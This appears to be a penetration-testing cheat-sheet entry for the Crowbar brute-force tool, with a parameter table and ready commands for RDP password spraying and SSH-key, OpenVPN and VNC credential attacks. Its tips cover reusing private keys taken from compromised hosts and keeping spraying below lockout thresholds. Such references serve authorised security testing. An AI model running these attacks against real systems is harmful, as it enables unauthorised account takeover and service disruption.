# Crowbar

- **Category**: Password Attacks / Online Brute-Force
- **Risk Level**: 🔴 High

---

## Description

A brute-force tool targeting protocols not reliably supported by hydra: RDP (Remote Desktop Protocol), OpenVPN, SSH private key authentication, and VNC key authentication. The most reliable tool for RDP credential testing — hydra's RDP support is often unreliable. Supports single targets, subnet lists, and parallel threads.

## Installation

```bash
sudo apt install crowbar
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `-b <protocol>` | Protocol: `rdp`, `openvpn`, `sshkey`, `vnckey` |
| `-s <target>` | Static target |
| `-S <file>` | Multiple targets stored in a file |
| `-u <user>` | Static name to login with |
| `-U <file>` | Multiple names to login with, stored in a file |
| `-c <pass>` | Static password to login with |
| `-C <file>` | Multiple passwords to login with, stored in a file |
| `-k <key>` | Private key file or folder containing multiple files |
| `-p <port>` | Alter the port if service is not using the default |
| `-n <n>` | Number of threads to be active at once |
| `-t <seconds>` | Timeout per connection |
| `-m <file>` | OpenVPN configuration file |
| `-d` | Port scan before attacking (discover open ports) |
| `-v` | Verbose output |
| `-o <file>` | Output file for results |

## Common Commands

```bash
# RDP brute force against a single host
crowbar -b rdp -s 192.168.1.10 -u administrator -C /usr/share/wordlists/rockyou.txt

# RDP brute force with user and password lists
crowbar -b rdp -s 192.168.1.10 -U users.txt -C passwords.txt

# RDP spray against multiple targets
crowbar -b rdp -S targets.txt -u administrator -C passwords.txt -n 5

# SSH private key brute force (try all keys in a directory)
crowbar -b sshkey -s 192.168.1.10 -u root -k /root/.ssh/

# OpenVPN brute force
crowbar -b openvpn -s vpn.example.com -u user -C passwords.txt

# Save results to file
crowbar -b rdp -s 192.168.1.10 -u administrator -C passwords.txt -v -o results.txt
```

## Notes & Tips

1. Use crowbar instead of hydra for RDP targets — crowbar is significantly more reliable for the RDP protocol.
2. Always check AD password policy before spraying to avoid locking accounts — enumerate with enum4linux-ng first.
3. For SSH private key brute-force, point `-k` at a directory containing collected private keys from compromised hosts.
4. Use `-n 5` or fewer threads for RDP — too many parallel connections may trigger lockouts or crash the RDP service.
5. Pair with netexec to first identify RDP-enabled hosts: `nxc rdp 192.168.1.0/24`.

---

## Official References

- [crowbar (GitHub)](https://github.com/galkan/crowbar)
- [Kali crowbar](https://www.kali.org/tools/crowbar/)
